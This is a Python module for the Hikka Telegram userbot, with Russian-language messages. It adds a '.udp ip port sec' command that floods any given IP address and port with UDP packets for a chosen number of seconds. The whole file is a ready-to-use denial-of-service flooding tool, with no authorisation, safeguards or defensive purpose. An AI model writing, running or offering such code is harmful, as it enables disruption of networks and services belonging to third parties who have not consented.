import socket
import asyncio
from hikka.tools import edit

class UdpFloodModule:
    name = "UdpFlood"
    description = "Модуль для отправки UDP пакетов"
    author = "@openaicodex"

    def __init__(self):
        self.commands = {"udp": self.udp_command}

    async def udp_command(self, message, args):
        if len(args) != 3:
            await edit(message, "Использование: .udp ip port sec")
            return

        ip, port, sec = args
        port = int(port)
        sec = int(sec)

        await edit(message, f"Начинаем отправку пакетов на {ip}:{port} на {sec} секунд...")
        await self.udp_flood(ip, port, sec)
        await edit(message, "Отправка пакетов завершена.")

    async def udp_flood(self, ip, port, duration):
        """ Функция для отправки UDP пакетов """
        start_time = asyncio.get_event_loop().time()
        with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as sock:
            while True:
                if (asyncio.get_event_loop().time() - start_time) > duration:
                    break
                try:
                    sock.sendto(b'RandomData', (ip, port))
                except Exception as e:
                    print(f"Ошибка отправки: {e}")

module = UdpFloodModule()
